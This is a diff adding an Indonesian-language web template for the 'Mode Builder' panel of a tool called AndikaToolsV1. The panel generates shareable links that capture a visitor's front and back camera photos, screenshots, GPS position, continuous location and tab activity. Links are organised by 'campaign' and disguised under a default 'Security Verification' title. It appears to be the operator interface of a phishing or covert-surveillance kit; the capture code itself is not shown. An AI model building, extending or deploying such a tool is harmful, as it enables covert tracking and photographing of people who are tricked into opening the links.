@@ -1,0 +1,150 @@
+{% extends "base_modern.html" %}
+{% set active = "modes" %}
+{% block title %}Modes - AndikaToolsV1{% endblock %}
+{% block head %}
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<style>
+.presets-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:12px; margin-bottom:28px; }
+.preset-card { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); padding:16px; cursor:pointer; transition:var(--transition); }
+.preset-card:hover { transform:translateY(-4px); box-shadow:var(--shadow-lg); border-color:var(--accent-primary); }
+.preset-card .name { font-weight:700; font-size:14px; color:var(--text-primary); margin-bottom:6px; }
+.preset-card .desc { font-size:11px; color:var(--text-muted); }
+.builder-card { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); padding:24px; margin-bottom:24px; }
+.builder-card h2 { margin:0 0 20px; font-size:18px; background:var(--gradient-primary); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+.field { margin-bottom:16px; }
+.field label { display:block; font-size:12px; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase; letter-spacing:0.5px; font-weight:500; }
+.field input, .field textarea { width:100%; padding:12px 14px; background:var(--bg-secondary); border:1px solid var(--border-subtle); border-radius:var(--radius-md); color:var(--text-primary); font-size:14px; font-family:inherit; box-sizing:border-box; }
+.field input:focus { outline:none; border-color:var(--accent-primary); }
+.toggle-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:10px; margin-bottom:16px; }
+.toggle { display:flex; align-items:center; gap:10px; padding:12px; background:var(--bg-secondary); border:1.5px solid var(--border-subtle); border-radius:var(--radius-md); cursor:pointer; user-select:none; }
+.toggle.on { border-color:var(--accent-green); background:rgba(16,185,129,0.08); }
+.toggle input { display:none; }
+.toggle .icon { font-size:20px; }
+.toggle .label { font-size:13px; color:var(--text-primary); font-weight:500; }
+.toggle .sub { font-size:10px; color:var(--text-dim); }
+.config-item { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); padding:16px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; }
+.config-item .name { font-weight:600; font-size:14px; margin-bottom:4px; }
+.config-item .meta { font-size:11px; color:var(--text-muted); }
+.feat-tag { font-size:10px; background:var(--bg-tertiary); padding:3px 8px; border-radius:10px; color:var(--text-muted); margin-right:4px; }
+</style>
+{% endblock %}
+{% block content %}
+<div class="topbar">
+  <div class="topbar-title">
+    <h1>🎯 Mode Builder</h1>
+    <p>Pilih fitur capture, generate link khusus</p>
+  </div>
+</div>
+<h3 style="color:var(--text-secondary);font-size:14px;margin:0 0 12px;text-transform:uppercase;letter-spacing:1px">⚡ Preset Cepat</h3>
+<div class="presets-grid" id="presetsGrid"></div>
+<div class="builder-card">
+  <h2>🔧 Custom Builder</h2>
+  <div class="field"><label>Nama Mode</label><input type="text" id="fldName" placeholder="Contoh: Test Karyawan"></div>
+  <div class="field"><label>Campaign</label><input type="text" id="fldCampaign" placeholder="default"></div>
+  <h4 style="color:var(--text-muted);font-size:12px;margin:20px 0 10px;text-transform:uppercase;letter-spacing:1px">Fitur</h4>
+  <div class="toggle-grid">
+    <label class="toggle" data-key="foto_depan"><input type="checkbox"><span class="icon">📷</span><div><div class="label">Foto Depan</div></div></label>
+    <label class="toggle" data-key="foto_belakang"><input type="checkbox"><span class="icon">📸</span><div><div class="label">Foto Belakang</div></div></label>
+    <label class="toggle" data-key="screenshot"><input type="checkbox"><span class="icon">🖼️</span><div><div class="label">Screenshot</div></div></label>
+    <label class="toggle" data-key="gps"><input type="checkbox"><span class="icon">📍</span><div><div class="label">GPS</div></div></label>
+    <label class="toggle" data-key="burst"><input type="checkbox"><span class="icon">⚡</span><div><div class="label">Burst Mode</div></div></label>
+    <label class="toggle" data-key="location_tracking"><input type="checkbox"><span class="icon">🛰️</span><div><div class="label">Location Track</div></div></label>
+    <label class="toggle" data-key="tab_log"><input type="checkbox"><span class="icon">👁️</span><div><div class="label">Tab Log</div></div></label>
+    <label class="toggle" data-key="wait_permission"><input type="checkbox" checked><span class="icon">🔒</span><div><div class="label">Tunggu Izin</div></div></label>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+    <div class="field"><label>Judul</label><input type="text" id="fldTitle" value="Verifikasi Keamanan"></div>
+    <div class="field"><label>Delay (detik)</label><input type="number" id="fldDelay" value="5"></div>
+  </div>
+  <div class="field"><label>Subtitle</label><textarea id="fldSubtitle" rows="2">Mohon tunggu sebentar...</textarea></div>
+  <button class="btn btn-primary" id="btnCreate" style="padding:14px 28px">🎯 Generate Link</button>
+</div>
+<div>
+  <h3 style="color:var(--text-secondary);font-size:14px;margin:0 0 12px;text-transform:uppercase;letter-spacing:1px">📋 Mode Tersimpan</h3>
+  <div id="configsList"></div>
+</div>
+<script>
+const FEAT_LABELS = { foto_depan:"📷 Depan", foto_belakang:"📸 Belakang", screenshot:"🖼️ SS", gps:"📍 GPS", burst:"⚡ Burst", location_tracking:"🛰️ Track", tab_log:"👁️ Tab" };
+function escHtml(s) { if (s==null) return ""; return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
+
+async function loadPresets() {
+  const res = await fetch("/api/modes/presets");
+  const presets = await res.json();
+  const grid = document.getElementById("presetsGrid");
+  grid.innerHTML = presets.map(p => '<div class="preset-card" data-preset=\'' + JSON.stringify(p).replace(/'/g,"&#39;") + '\'><div class="name">' + escHtml(p.name) + '</div><div class="desc">' + escHtml(p.desc) + '</div></div>').join("");
+  grid.querySelectorAll(".preset-card").forEach(card => {
+    card.addEventListener("click", () => {
+      const p = JSON.parse(card.dataset.preset);
+      applyConfig(p.config);
+      document.getElementById("fldName").value = p.name;
+      Swal.fire({toast:true,position:"top-end",icon:"success",title:"Preset diterapkan",timer:1200,showConfirmButton:false,background:"#131829",color:"#f8fafc"});
+    });
+  });
+}
+function applyConfig(cfg) {
+  document.querySelectorAll(".toggle").forEach(t => {
+    const k = t.dataset.key;
+    if (cfg[k] === undefined) return;
+    const i = t.querySelector("input");
+    i.checked = !!cfg[k];
+    t.classList.toggle("on", !!cfg[k]);
+  });
+}
+function collectConfig() {
+  const cfg = {};
+  document.querySelectorAll(".toggle").forEach(t => { cfg[t.dataset.key] = t.querySelector("input").checked; });
+  return cfg;
+}
+document.querySelectorAll(".toggle").forEach(t => {
+  const input = t.querySelector("input");
+  t.addEventListener("click", e => { if (e.target.tagName !== "INPUT") input.checked = !input.checked; t.classList.toggle("on", input.checked); });
+  input.addEventListener("change", () => t.classList.toggle("on", input.checked));
+  if (input.checked) t.classList.add("on");
+});
+document.getElementById("btnCreate").addEventListener("click", async () => {
+  const name = document.getElementById("fldName").value.trim();
+  if (!name) return Swal.fire("Perlu nama","Isi nama mode dulu","warning");
+  const cfg = collectConfig();
+  cfg.name = name;
+  cfg.campaign = document.getElementById("fldCampaign").value.trim();
+  cfg.title = document.getElementById("fldTitle").value.trim();
+  cfg.subtitle = document.getElementById("fldSubtitle").value.trim();
+  cfg.delay_seconds = parseInt(document.getElementById("fldDelay").value) || 5;
+  const btn = document.getElementById("btnCreate");
+  btn.disabled = true;
+  btn.textContent = "⏳ Generating...";
+  try {
+    const res = await fetch("/api/modes/create", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify(cfg) });
+    const data = await res.json();
+    if (data.ok) {
+      const link = location.origin + "/m/" + data.slug;
+      Swal.fire({
+        icon:"success", title:"🎉 Link Berhasil!",
+        html:'<input value="' + escHtml(link) + '" readonly style="width:100%;padding:12px;background:#0a0e1a;color:#6366f1;border:1px solid #1e293b;border-radius:8px;font-size:12px;box-sizing:border-box" onclick="this.select()">' +
+             '<button onclick="navigator.clipboard.writeText(this.previousElementSibling.value);this.textContent=\'✅ Copied!\'" style="margin-top:10px;padding:10px 20px;background:#6366f1;color:#fff;border:none;border-radius:8px;cursor:pointer">📋 Copy</button>',
+        background:"#131829", color:"#f8fafc", confirmButtonColor:"#6366f1",
+      });
+      loadConfigs();
+    } else { Swal.fire("Gagal", data.msg || "Error", "error"); }
+  } catch (e) { Swal.fire("Error", e.message, "error"); }
+  finally { btn.disabled = false; btn.textContent = "🎯 Generate Link"; }
+});
+async function loadConfigs() {
+  const res = await fetch("/api/modes/list");
+  const configs = await res.json();
+  const list = document.getElementById("configsList");
+  if (!configs.length) { list.innerHTML = '<p style="color:var(--text-dim);text-align:center;padding:40px">Belum ada mode tersimpan</p>'; return; }
+  list.innerHTML = configs.map(c => {
+    const feats = ["foto_depan","foto_belakang","screenshot","gps","burst","location_tracking","tab_log"].filter(k => c[k]).map(k => '<span class="feat-tag">' + (FEAT_LABELS[k] || k) + '</span>').join("");
+    const link = location.origin + "/m/" + c.slug;
+    return '<div class="config-item"><div style="flex:1"><div class="name">' + escHtml(c.name) + '</div><div class="meta">Campaign: ' + escHtml(c.campaign) + ' · Dipakai ' + (c.used_count || 0) + 'x</div><div style="margin-top:6px">' + (feats || '<span class="feat-tag">-</span>') + '</div><div class="meta" style="margin-top:6px"><code style="color:var(--accent-primary)">/m/' + escHtml(c.slug) + '</code></div></div><div style="display:flex;gap:6px"><button class="btn" onclick="copyM(\'' + link + '\')">📋</button><a class="btn btn-primary" href="/m/' + c.slug + '" target="_blank">▶</a><button class="btn btn-red" onclick="delMode(' + c.id + ')">🗑️</button></div></div>';
+  }).join("");
+}
+function copyM(link) { navigator.clipboard.writeText(link); Swal.fire({toast:true,position:"top-end",icon:"success",title:"Copied!",timer:1200,showConfirmButton:false,background:"#131829",color:"#f8fafc"}); }
+async function delMode(id) { const r = await Swal.fire({title:"Hapus?",icon:"warning",showCancelButton:true,confirmButtonText:"Hapus",confirmButtonColor:"#ef4444",background:"#131829",color:"#f8fafc"}); if (!r.isConfirmed) return; await fetch("/api/modes/delete/" + id, {method:"POST"}); loadConfigs(); }
+loadPresets();
+loadConfigs();
+applyConfig({foto_depan:true, foto_belakang:true, gps:true, wait_permission:true});
+</script>
+{% endblock %}
